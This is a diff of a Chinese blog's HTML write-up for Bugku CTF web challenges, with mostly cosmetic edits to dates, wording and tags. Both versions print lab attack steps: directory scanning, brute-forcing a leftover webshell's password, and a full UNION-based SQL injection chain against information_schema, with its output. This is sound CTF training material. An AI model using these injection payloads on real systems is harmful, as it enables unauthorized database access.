@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      25
+      24
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 个月前
+                  本文最后更新于：7 天前
                 
               </p>
             
@@ -327,7 +327,7 @@ highlight_file(<span class="hljs-keyword">__file__</span>);
 <p>打开题目，发现鼠标动不了，可能是被黑后的后遗症</p>
 <p>先扫描目录发现了<code>shell.php</code>,这可能是上次黑客留下的小马文件</p>
 <p><img src="/2020/09/06/bugku1-10/hack2.png" srcset="/img/loading.gif" alt></p>
-<p>打开页面，需要密码，这就需要爆破了(查看了wp,知道了密码为hack,不知道时就需要一个足够大的密码字典才能破解)</p>
+<p>打开页面，需要密码，这就需要爆破了(密码为hack)</p>
 <p>确定要爆破的变量</p>
 <p><img src="/2020/09/06/bugku1-10/hack3.png" srcset="/img/loading.gif" alt></p>
 <p>加载密码字典</p>
@@ -386,7 +386,7 @@ a.focus();
 &lt;&#x2F;html&gt;</code></pre></div>
 
 <p>获取flag{edulcni_elif_lacol_si_siht}</p>
-<h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破</p>
+<h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破，可用burpsuit的爆破模块</p>
 <p><img src="/2020/09/06/bugku1-10/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81.png" srcset="/img/loading.gif" alt></p>
 <h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开题目后，出现一段代码，应该是md5值，可是解码为空密码</p>
 <p>扫描目录<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
@@ -440,19 +440,22 @@ s214587387a</code></pre></div><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB
   
 1' and 1=2 #</code></pre></div>
 <p>   不显示内容，可以判断存在注入点</p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 #</code>可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`
+<h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 #</code>可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>-1&apos; union select 1,database(),3,4 #
+database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 #
 
-  database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
-<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
-<p> 得到flag</p>
-<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
-<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做（菜鸡不配），网上找的脚本</p>
+ table:fl4g,sc</code></pre></div><h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #
+ skctf_flag</code></pre></div><p> 得到flag</p>
+<div class="hljs"><pre><code class="hljs clojure">(<span class="hljs-name">select</span> skctf_flag from skctf_flag.fl4g)</code></pre></div>
+
+
+
+<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> re
 url=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span>
 r=requests.session()
 requestpage = r.get(url)
-ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#获取表达式，我正则写的好像有点问题，多匹配了最后的=?两个字符</span>
+ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#获取表达式</span>
 ans=<span class="hljs-string">""</span>.join(ans)<span class="hljs-comment">#列表转为字符串</span>
 ans=ans[:<span class="hljs-number">-2</span>]<span class="hljs-comment">#去掉最后的=?</span>
 post=eval(ans)<span class="hljs-comment">#计算表达式的值</span>
@@ -475,15 +478,15 @@ print(flag.text)</code></pre></div>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
-                    
-                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
-                    
                       <a class="hover-with-bg" href="/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/">弱类型</a>
                     
                       <a class="hover-with-bg" href="/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">域名解析</a>
                     
                       <a class="hover-with-bg" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
+                    
+                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
                     
                       <a class="hover-with-bg" href="/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
                     
